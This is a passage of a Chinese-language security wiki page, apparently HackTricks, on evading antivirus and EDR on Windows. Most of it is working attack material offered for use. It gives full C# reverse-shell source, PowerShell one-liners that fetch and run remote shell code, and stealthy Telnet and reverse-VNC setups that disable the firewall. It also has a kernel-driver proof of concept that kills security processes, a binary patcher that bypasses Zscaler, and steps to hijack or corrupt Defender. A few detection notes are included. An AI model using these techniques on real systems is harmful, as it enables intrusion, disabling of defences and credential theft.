你可以使用 [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)，它会**移除二进制的部分内容**，直到**找出 Defender 认为恶意的部分**并将其分离出来。\
另一个做同样事情的工具是 [**avred**](https://github.com/dobin/avred)，其开放的网页服务位于 [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

直到 Windows10，所有 Windows 都附带一个可以安装的 **Telnet server**（需以管理员身份）操作：
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
使它在系统启动时**启动**并立即**运行**：
```bash
sc config TlntSVR start= auto obj= localsystem
```
**更改 telnet port** (隐蔽) 并禁用 firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (你想要 bin downloads，而不是 setup)

**ON THE HOST**: Execute _**winvnc.exe**_ and configure the server:

- 启用选项 _Disable TrayIcon_
- 在 _VNC Password_ 中设置密码
- 在 _View-Only Password_ 中设置密码

然后，将二进制文件 _**winvnc.exe**_ 和**新创建**的文件 _**UltraVNC.ini**_ 放到 **victim** 中

#### **Reverse connection**

**attacker** 应该在其 **host** 上执行二进制 `vncviewer.exe -listen 5900`，以便准备接收反向 **VNC connection**。然后，在 **victim** 上：启动 winvnc 守护进程 `winvnc.exe -run` 并运行 `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** 为了保持隐蔽你必须避免以下操作

- 不要在 `winvnc` 已经运行时再次启动 `winvnc`，否则会触发一个 [popup](https://i.imgur.com/1SROTTl.png)。可用 `tasklist | findstr winvnc` 检查是否在运行
- 不要在没有与之同目录的 `UltraVNC.ini` 的情况下启动 `winvnc`，否则会打开 [配置窗口](https://i.imgur.com/rfMQWcf.png)
- 不要运行 `winvnc -h` 获取帮助，否则会触发一个 [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
在 GreatSCT 内：
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
现在使用 `msfconsole -r file.rc` **start the lister** 并使用以下命令 **execute** the **xml payload**:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**当前的 Defender 会非常快地终止该进程。**

### 编译我们自己的 reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 第一个 C# Revershell

用以下命令编译：
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
与之一起使用：
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# 使用编译器
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自动下载并执行：
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# 混淆器列表: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### 使用 python 构建注入器示例：

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### 其他工具
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### 更多

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – 从内核空间终结 AV/EDR

Storm-2603 利用了名为 **Antivirus Terminator** 的一个小型控制台工具，在投放勒索软件之前禁用端点保护。该工具带来了它的**自有、但已*签名*的易受攻驱动**，并滥用它来发出特权内核操作，即便是 Protected-Process-Light (PPL) 的 AV 服务也无法阻止。

关键要点
1. **已签名驱动**：写入磁盘的文件是 `ServiceMouse.sys`，但二进制实际上是 Antiy Labs “System In-Depth Analysis Toolkit” 中合法签名的驱动 `AToolsKrnl64.sys`。因为该驱动具有有效的 Microsoft 签名，即使启用了 Driver-Signature-Enforcement (DSE) 也会被加载。
2. **服务安装**：
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
第一行将驱动注册为**内核服务**，第二行启动它，使 `\\.\ServiceMouse` 从用户态变得可访问。
3. **驱动暴露的 IOCTL**
| IOCTL code | 能力 |
|-----------:|-----------------------------------------|
| `0x99000050` | 通过 PID 终止任意进程（用于终止 Defender/EDR 服务） |
| `0x990000D0` | 删除磁盘上的任意文件 |
| `0x990001D0` | 卸载驱动并移除服务 |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **为什么可行**：BYOVD 完全绕过了用户态保护；在内核中执行的代码可以打开受*保护*的进程、终止它们，或篡改内核对象，而不受 PPL/PP、ELAM 或其他强化特性的限制。

检测 / 缓解
• 启用 Microsoft 的易受攻驱动阻止列表（`HVCI`, `Smart App Control`），以便 Windows 拒绝加载 `AToolsKrnl64.sys`。  
• 监控新*内核*服务的创建，并在驱动从可被所有人写入的目录加载或不在允许列表时发出告警。  
• 关注对自定义设备对象的用户态句柄创建，及随后可疑的 `DeviceIoControl` 调用。

### 通过对磁盘上二进制打补丁绕过 Zscaler Client Connector 的 Posture 检查

Zscaler 的 **Client Connector** 在本地应用设备态（posture）规则，并依赖 Windows RPC 将结果与其他组件通信。有两个设计上的薄弱点使得完全绕过成为可能：

1. Posture 评估**完全在客户端**进行（向服务器发送的是一个布尔值）。  
2. 内部 RPC 端点仅验证连接的可执行文件是否**由 Zscaler 签名**（通过 `WinVerifyTrust`）。

通过**在磁盘上打补丁四个已签名的二进制**，这两个机制都可以被中和：

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 始终返回 `1`，因此每次检查都被判定为合规 |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ 任何（即使未签名的）进程都可以绑定到 RPC 管道 |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | 被替换为 `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integrity checks on the tunnel | 被短路 |

Minimal patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
After replacing the original files and restarting the service stack:

* **所有** 态势检查显示 **绿色/合规**。
* 未签名或已修改的二进制文件可以打开命名管道 RPC 端点（例如 `\\RPC Control\\ZSATrayManager_talk_to_me`）。
* 被攻陷的主机获得对由 Zscaler 策略定义的内部网络的不受限制访问。

此案例展示了纯客户端信任决策和简单签名检查如何通过少量字节补丁被绕过。

## 滥用 Protected Process Light (PPL) 以通过 LOLBINs 篡改 AV/EDR

Protected Process Light (PPL) 强制执行签名者/级别层级，只有相同或更高级别的受保护进程才能相互篡改。从攻击角度看，如果你能够合法启动一个启用了 PPL 的二进制并控制其参数，就可以将良性功能（例如日志记录）转换为针对 AV/EDR 所使用受保护目录的受限、由 PPL 支持的写入原语。

使进程以 PPL 运行的条件
- 目标 EXE（以及任何加载的 DLL）必须使用支持 PPL 的 EKU 进行签名。
- 该进程必须使用 CreateProcess 创建，并带有标志：`EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`。
- 必须请求与二进制的签名者匹配的兼容保护级别（例如，对于反恶意软件签名者使用 `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`，对于 Windows 签名者使用 `PROTECTION_LEVEL_WINDOWS`）。错误的级别将在创建时失败。

另见关于 PP/PPL 和 LSASS 保护的更广泛介绍：

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher 工具
- 开源辅助工具：CreateProcessAsPPL（选择保护级别并将参数转发给目标 EXE）：
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- 使用模式：
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- 签名的系统二进制文件 `C:\Windows\System32\ClipUp.exe` 会自我生成进程并接受一个参数，用于将日志写入调用者指定的路径。
- 当以 PPL 进程启动时，文件写入会在 PPL 权限下进行。
- ClipUp 无法解析包含空格的路径；使用 8.3 短路径来指向通常受保护的位置。

8.3 short path helpers
- 列出短名称：在每个父目录中运行 `dir /x`。
- 在 cmd 中推导短路径：`for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) 使用支持 PPL 的启动器（例如 CreateProcessAsPPL），通过 `CREATE_PROTECTED_PROCESS` 启动可进行 PPL 的 LOLBIN（ClipUp）。
2) 传递 ClipUp 的 log-path 参数以强制在受保护的 AV 目录（例如 Defender Platform）中创建文件。如有需要，使用 8.3 短名称。
3) 如果目标二进制文件在 AV 运行时通常被打开/锁定（例如 MsMpEng.exe），通过安装一个能更早可靠运行的自动启动服务，将写入安排在 AV 启动之前的开机阶段。使用 Process Monitor（boot logging）验证启动顺序。
4) 重启后，具有 PPL 背书的写入将在 AV 锁定其二进制文件之前发生，破坏目标文件并阻止其启动。

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- 除了放置位置外，无法控制 ClipUp 写入的内容；该原语更适合用于破坏而非精确的内容注入。
- 需要本地管理员/SYSTEM 权限来安装/启动服务，并需要一个重启窗口。
- 时序关键：目标必须未被打开；在引导时执行可以避免文件锁定。

Detections
- 在引导期间，创建带有异常参数的 `ClipUp.exe` 进程，尤其是当其父进程不是标准启动器时。
- 新的服务被配置为自动启动可疑二进制文件，并且经常在 Defender/AV 之前启动。调查 Defender 启动失败之前的服务创建/修改。
- 对 Defender 二进制/Platform 目录实施文件完整性监控；注意由带有 protected-process 标志的进程导致的异常文件创建/修改。
- ETW/EDR 遥测：查找使用 `CREATE_PROTECTED_PROCESS` 创建的进程，以及非 AV 二进制异常使用 PPL 级别的情况。

Mitigations
- WDAC/Code Integrity：限制哪些签名二进制可作为 PPL 运行以及在何种父进程下运行；阻止 ClipUp 在合法上下文之外被调用。
- 服务管理：限制自动启动服务的创建/修改，并监控启动顺序被操纵的情况。
- 确保启用 Defender 篡改保护和早期加载保护；调查表明二进制被损坏的启动错误。
- 如果与您的环境兼容，考虑在托管安全工具的卷上禁用 8.3 短名称生成（需充分测试）。

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender chooses the platform it runs from by enumerating subfolders under:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

It selects the subfolder with the highest lexicographic version string (e.g., `4.18.25070.5-0`), then starts the Defender service processes from there (updating service/registry paths accordingly). This selection trusts directory entries including directory reparse points (symlinks). An administrator can leverage this to redirect Defender to an attacker-writable path and achieve DLL sideloading or service disruption.

Preconditions
- Local Administrator (needed to create directories/symlinks under the Platform folder)
- Ability to reboot or trigger Defender platform re-selection (service restart on boot)
- Only built-in tools required (mklink)

Why it works
- Defender 阻止在其自身文件夹中写入，但其平台选择信任目录条目并选择字典序最高的版本字符串，而不验证目标是否解析到受保护/受信任的路径。

Step-by-step (example)
1) Prepare a writable clone of the current platform folder, e.g. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) 在 Platform 内创建一个指向你文件夹的更高版本目录 symlink：
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) 触发选择 (reboot recommended):
```cmd
shutdown /r /t 0
```
4) 验证 MsMpEng.exe (WinDefend) 是否从重定向路径运行：
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
你应该能在 `C:\TMP\AV\` 下看到新的进程路径，并在服务配置/注册表中看到反映该位置的设置。

Post-exploitation options
- DLL sideloading/code execution: 将 Defender 从其应用程序目录加载的 DLLs 放置/替换，以在 Defender 的进程中执行代码。参见上文章节：[DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: 删除 version-symlink，这样在下一次启动时配置的路径无法解析，Defender 将无法启动：
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> 注意：此技术本身不提供权限提升；需要管理员权限。

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

红队可以通过 hook 目标模块的 Import Address Table (IAT)，并将选定的 APIs 路由到攻击者控制的 position‑independent code (PIC)，把运行时规避从 C2 implant 移到目标模块自身。这样将规避泛化到超出许多 kits 暴露的小 API 面（例如 CreateProcessA），并将相同的保护扩展到 BOFs 和 post‑exploitation DLLs。

High-level approach
- 使用 reflective loader（前置或伴随）在目标模块旁部署一个 PIC blob。该 PIC 必须是自包含且 position‑independent。
- 当宿主 DLL 加载时，遍历其 IMAGE_IMPORT_DESCRIPTOR 并修补目标导入的 IAT 条目（例如 CreateProcessA/W、CreateThread、LoadLibraryA/W、VirtualAlloc），使其指向轻量的 PIC wrapper。
- 每个 PIC wrapper 在对真实 API 地址进行尾调用之前执行规避。典型的规避包括：
  - 在调用前后对内存进行掩蔽/取消掩蔽（例如，加密 beacon 区域、将 RWX→RX、修改页面名称/权限），然后在调用后恢复。
  - Call‑stack spoofing：构造一个良性的栈并切入目标 API，使调用栈分析解析出预期的帧。
- 为兼容性，导出一个接口，以便 Aggressor script（或等效工具）可以注册要为 Beacon、BOFs 和 post‑ex DLLs hook 的 API 列表。

Why IAT hooking here
- 适用于任何使用被 hook 的导入的代码，无需修改工具代码或依赖 Beacon 来代理特定 API。
- 覆盖 post‑ex DLLs：hook LoadLibrary* 允许你拦截模块加载（例如 System.Management.Automation.dll、clr.dll），并将相同的掩蔽/栈规避应用到它们的 API 调用上。
- 通过封装 CreateProcessA/W，可以在针对基于调用栈的检测时，恢复对进程生成类 post‑ex 命令的可靠使用。

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
注意事项
- 在 relocations/ASLR 之后、首次使用 import 之前应用补丁。Reflective loaders（例如 TitanLdr/AceLdr）演示了在加载模块的 DllMain 期间进行 hooking。
- 保持 包装器 (wrappers) 小且 PIC-safe；通过在打补丁前捕获的原始 IAT 值或通过 LdrGetProcedureAddress 来解析真实 API。
- 对 PIC 使用 RW → RX 的转换，避免留下可写+可执行的页面。

Call‑stack spoofing stub
- Draugr‑style PIC stubs 构建一个伪造的调用链（返回地址指向良性模块），然后转向真实 API。
- 这能绕过那些期望从 Beacon/BOFs 到敏感 APIs 的规范堆栈的检测。
- 将其与 stack cutting/stack stitching 技术配合，以在 API prologue 之前落在预期的帧内。

Operational integration
- 将 reflective loader 前置到 post‑ex DLLs，这样 PIC 和 hooks 在 DLL 加载时会自动初始化。
- 使用 Aggressor script 注册目标 APIs，使 Beacon 和 BOFs 在不改代码的情况下透明地受益于相同的规避路径。

Detection/DFIR considerations
- IAT integrity：解析到非‑image（heap/anon）地址的条目；对 import 指针进行周期性验证。
- Stack anomalies：返回地址不属于已加载镜像；向非‑image PIC 的突兀跳转；RtlUserThreadStart 继承链不一致。
- Loader telemetry：进程内对 IAT 的写入、修改 import thunks 的早期 DllMain 活动、加载时创建的意外 RX 区域。
- Image‑load evasion：如果 hooking LoadLibrary*，监控与 memory masking 事件相关联的可疑 automation/clr assemblies 加载。

Related building blocks and examples
- 在加载期间执行 IAT patching 的 Reflective loaders（例如 TitanLdr、AceLdr）
- Memory masking hooks（例如 simplehook）和 stack‑cutting PIC（stackcutting）
- PIC call‑stack spoofing stubs（例如 Draugr）

## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer（又名 BluelineStealer）展示了现代 info-stealers 如何在单一工作流中融合 AV bypass、anti-analysis 和 credential access。

### Keyboard layout gating & sandbox delay

- 一个配置标志（`anti_cis`）通过 `GetKeyboardLayoutList` 枚举已安装的键盘布局。如果发现 Cyrillic 布局，样本会丢弃一个空的 `CIS` 标记并在运行 stealers 之前终止，确保它不会在被排除的区域触发，同时留下一个 hunting artifact。
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### 分层的 `check_antivm` 逻辑

- 变体 A 遍历进程列表，对每个名称使用自定义的滚动校验和进行哈希，并将其与嵌入的调试器/沙箱黑名单比较；它还对计算机名重复该校验和，并检查工作目录（例如 `C:\analysis`）。
- 变体 B 检查系统属性（进程数下限、最近的运行时间），调用 `OpenServiceA("VBoxGuest")` 以检测 VirtualBox 附加组件，并在 sleep 周期周围执行定时检测以发现单步执行。一旦命中则在模块启动前中止。

### 无文件助手 + 双 ChaCha20 反射加载

- 主 DLL/EXE 嵌入了一个 Chromium 凭证助手，该助手要么被写入磁盘，要么以手动映射方式驻留内存；无文件模式下它自行解析导入/重定位，因此不会写出助手痕迹。
- 该助手将第二阶段 DLL 使用 ChaCha20 进行了两次加密（两个 32 字节键 + 12 字节 nonces）。两次加密完成后，它以反射方式加载该 blob（不使用 `LoadLibrary`），并调用源自 [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) 的导出函数 `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`。
- ChromElevator 例程使用 direct-syscall 反射式 process hollowing 注入到运行中的 Chromium 浏览器中，继承 AppBound Encryption keys，并直接从 SQLite 数据库解密密码/cookies/credit cards，尽管存在 ABE 加固。

### 模块化内存采集 & 分块 HTTP 外传

- `create_memory_based_log` 遍历全局 `memory_generators` 函数指针表，并为每个启用的模块（Telegram、Discord、Steam、截图、文档、浏览器扩展等）创建一个线程。每个线程将结果写入共享缓冲区，并在大约 45s 的 join 窗口后报告其文件数量。
- 完成后，使用静态链接的 `miniz` 库将所有内容压缩为 `%TEMP%\\Log.zip`。`ThreadPayload1` 随后休眠 15s，并通过 HTTP POST 将归档以 10 MB 切块流式传输到 `http://<C2>:6767/upload`，伪造浏览器 `multipart/form-data` 边界（`----WebKitFormBoundary***`）。每个切块会添加 `User-Agent: upload`、`auth: <build_id>`、可选的 `w: <campaign_tag>`，最后一个切块附加 `complete: true`，以便 C2 知道重组已完成。

## 参考资料

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [Rapid7 – SantaStealer is Coming to Town: A New, Ambitious Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [ChromElevator – Chrome App Bound Encryption Decryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)

{{#include ../banners/hacktricks-training.md}}
